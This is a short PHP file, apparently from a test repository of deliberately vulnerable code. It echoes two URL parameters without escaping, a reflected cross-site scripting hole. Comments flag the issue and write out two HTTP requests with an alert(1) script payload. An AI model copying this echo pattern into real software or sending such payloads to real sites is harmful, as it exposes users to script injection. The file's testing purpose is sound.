<?php
//TODO: AI XSS issue #191, Medium, Cross-site Scripting, https://github.com/userwithrepo/ACSI_S4/issues/191, 5136ee90
//AI exploit:
//GET /../../../../../../PHP_Repos/userwithrepo.ACSI_S4/userwithrepo-ACSI_S4-1abea16/vulnerable.php?id2=%3Cscript%3Ealert%281%29%3C%2Fscript%3E HTTP/1.1
//Host: localhost
//Accept-Encoding: identity
//Connection: close
//TODO: AI XSS issue #191, Medium, Cross-site Scripting, https://github.com/userwithrepo/ACSI_S4/issues/191, 2a16bcf3
//AI exploit:
//GET /../../../../../../PHP_Repos/userwithrepo.ACSI_S4/userwithrepo-ACSI_S4-1abea16/vulnerable.php?id1=%3Cscript%3Ealert%281%29%3C%2Fscript%3E HTTP/1.1
//Host: localhost
//Accept-Encoding: identity
//Connection: close
echo $_GET['id1']." ".$_GET['id2'];
?>
